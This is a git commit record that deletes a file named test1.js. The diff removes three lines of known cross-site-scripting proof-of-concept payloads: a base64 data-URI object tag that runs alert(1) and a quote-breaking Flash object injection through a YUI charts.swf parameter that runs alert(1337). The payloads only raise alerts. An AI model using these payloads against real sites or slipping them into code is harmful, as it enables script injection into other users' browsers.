a29ffd800ab8be92c324bd85be927abb65457004
sudinnk <48651902+sudinnk@users.noreply.github.com>
2024-10-30 22:30:16 +0400

    Delete test1.js

--- test1.js
+++
@@ -1,3 +0,0 @@
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
-">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
-<param name="AllowScriptAccess" value="always"></object>
